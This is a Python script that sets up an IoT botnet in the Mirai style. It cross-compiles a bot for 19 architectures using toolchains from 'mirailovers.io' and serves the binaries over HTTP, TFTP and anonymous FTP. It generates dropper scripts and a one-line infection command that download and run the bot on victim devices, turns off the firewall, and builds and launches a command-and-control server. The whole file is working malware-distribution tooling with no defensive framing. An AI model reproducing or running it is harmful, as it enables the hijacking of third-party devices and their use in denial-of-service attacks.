import subprocess, sys

bot = sys.argv[1]
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " bot.c 1.1.1.1 \x1b[0m")
    exit(1)

def system(cmd):
    subprocess.call(cmd, shell=True)

botport = "4444"
threads = "800"
cncport = "1337"

archnames = [
    "windy.arm4", "windy.arm4t", "windy.arm5", "windy.arm6",
    "windy.i686", "windy.m68", "windy.mips", "windy.mpsl",
    "windy.ppc", "windy.spc", "windy.x86", "windy.sh4",
    "windy.arm7", "windy.arm64", "windy.riscv64",
    "windy.riscv32", "windy.mips64", "windy.mpsl64", "windy.loong64"
]

getarch = [
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4tl.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-aarch64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-riscv64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-riscv32.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel64.tar.bz2",
    "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-loongarch64.tar.bz2"
]

compilers = [
    "cross-compiler-armv4l", "cross-compiler-armv4tl",
    "cross-compiler-armv5l", "cross-compiler-armv6l",
    "cross-compiler-i686", "cross-compiler-m68k",
    "cross-compiler-mips", "cross-compiler-mipsel",
    "cross-compiler-powerpc", "cross-compiler-sparc",
    "cross-compiler-x86_64", "cross-compiler-sh4",
    "cross-compiler-armv7l", "cross-compiler-aarch64",
    "cross-compiler-riscv64", "cross-compiler-riscv32",
    "cross-compiler-mips64", "cross-compiler-mipsel64",
    "cross-compiler-loongarch64"
]

update_server = raw_input("Update Server? Y/n: ")
if update_server.lower() == "y":
	print("Updating Server")
	system("sudo apt update -y")
else:
    update_server = False

depends = raw_input("Install Dependencies? Y/n: ")
if depends.lower() == "y":
    print("Installing Dependencies")
    system("sudo apt install perl -y")
    system("sudo apt install gcc* -y")
    system("sudo apt install bzip2 -y")
    system("sudo apt install gcc-c++ -y")
    system("sudo apt install cpan -y")
    system("sudo apt install httpd -y")
    system("sudo apt install tftp -y")
    system("sudo apt install screen -y")
    system("sudo apt install nano -y")
    system("sudo apt install unzip -y")
    system("sudo apt install tar -y")
    system("sudo apt install busybox -y")
    system("sudo apt install python-paramiko -y")
else:
    depends_install = False

download = raw_input("Download Cross Compilers? Y/n: ")
if download.lower() == "y":
    get_arch = True
else:
    get_arch = False
system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
if get_arch == True:
    system("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        system("wget " + arch + " --no-check-certificate >> /dev/null")
        system("tar -xvf *tar.bz2")
        system("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")
num = 0
for cc in compilers:
    arch = cc.split("-")[2]
    system("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + archnames[num] + " " + bot + " > /dev/null")
    num += 1

system("sudo apt install httpd -y")
system("service httpd start")
system("sudo apt install xinetd tftp tftp-server -y")
system("sudo apt install vsftpd -y")
system("service vsftpd start")
system('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
system("service xinetd start")
system('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
system("service vsftpd restart")

system('echo -e "#!/bin/bash" > /var/www/html/bins.sh')
for i in archnames:
    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
	
for i in archnames:
    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')

system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
for i in archnames:
    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
	
system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
for i in archnames:
    system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
for i in archnames:
    system("cp " + i + " /var/www/html")
    system("cp " + i + " /var/ftp")
    system("mv " + i + " /var/lib/tftpboot")

print("Stopping Iptables")
system("service iptables stop")
system("chkconfig iptables off")
print("Restarting Xinetd")
system("service xinetd restart")
print("Restarting Httpd")
system("service httpd restart")

print("Changing Ulimit")
system("ulimit -n 999999; ulimit -Sn 99999")
system("ulimit -u 999999;ulimit -n 999999")
system('echo -e "ulimit -n 99999" >> ~/.bashrc')
system("sysctl -w fs.file-max=999999 >/dev/null")
system('echo "#.bashrc">> .bashrc')
system('echo "#ulimit set">> .bashrc')
system('echo "ulimit -u 999999">> .bashrc')
system('echo "ulimit -n 999999">> .bashrc')

system('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp ' + ip + ' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g ' + ip + '; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> ~/net/wget.txt')

compile_cnc = raw_input("Cross Compile C&C And Screen It? Y/n: ")
if compile_cnc.lower() == "y":
	print("Setting Up C&C")
	system("service iptables stop")
	system("cd ~/net; gcc cnc.c -o cnc -pthread")
	system("cd ~/net; screen ./cnc "+botport+" "+threads+" "+cncport+"")
else:
    compile_cnc = False
print ("Netis is a hakkka")
